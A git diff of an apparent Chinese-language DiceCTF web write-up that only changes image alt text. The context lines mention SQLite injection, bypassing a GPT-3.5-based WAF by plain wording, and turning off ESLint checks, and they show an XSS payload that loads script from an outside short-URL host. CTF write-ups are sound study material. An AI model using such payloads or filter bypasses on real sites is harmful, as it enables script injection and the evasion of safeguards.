@@ -79,7 +79,7 @@ app.listen(PORT, () => console.log(`web/funnylogin listening on port ${PORT}`));
 
 其他的就是一些数据库的初始化，其中最明显的就是
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
 这个sqlite注入了，肯定是能注入的，但是要想要拿到admin才可以(数据库无flag)，而admin是随机注入进去的，其中有一句代码我没看多懂
 
@@ -165,7 +165,7 @@ services:
 
 记得把这个换成自己的api，
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 别的我也看不懂，ejs渲染漏洞，还有一个waf是要绕过GPT的语义，我们直接说话就好了，因为GPT3.5真的挺笨的
 
@@ -231,7 +231,7 @@ flag.push([[0,9],[9,1]]);
 console.log("flag: dice{pr0_duck_gam3r_" + encode(flag) + "}")
 ```
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 别说控制台还是挺好用
 
@@ -308,15 +308,15 @@ export const sanitize = async (
 
 这个`sanitize.ts`中的限制完全可以当做是没有，
 
-![1](./assets/004.jpg)
+![image](./assets/004.jpg)
 
 在`project.ts`我们可以知道里面很多**ESLint 规则**(通过预定义的代码模式匹配和逻辑判断)，index有部分黑名单
 
-![1](./assets/005.jpg)
+![image](./assets/005.jpg)
 
 利用断言语句
 
-![1](./assets/006.jpg)
+![image](./assets/006.jpg)
 
 但是要知道的是，这些都是警告，如果把警告给关了就可以注入html字符，怎么关呢，利用`/*eslint-disable*/`  [官方文档](https://eslint.org/docs/latest/use/configure/rules)
 
@@ -368,7 +368,7 @@ const comments = (ts.getLeadingCommentRanges(text, 0) ?? [])
 
 意味着我们不能使用注释\断言\以及部分xss符号，这里我们可以用eval，来进行，只不过要绕过类型检测，可以借用函数`parseInt`，还有一个特性，我们可以让其本来是强制转化为int类型的参数，变为字符串类型，payload为`parseInt=str=>str`，进行测试
 
-![1](./assets/007.jpg)
+![image](./assets/007.jpg)
 
 ```js
 eval("parseInt=str=>str"),parseInt("<scripT src=/"+"/shorturl.at/VhRgx></script>")
@@ -414,7 +414,7 @@ services:
       - "3000:3000"
 ```
 
-![1](./assets/008.jpg)
+![image](./assets/008.jpg)
 
 在index.html里面发现CSP
 
@@ -659,5 +659,5 @@ if __name__ == '__main__':
 
 ```
 
-![1](./assets/009.jpg)
+![image](./assets/009.jpg)
 
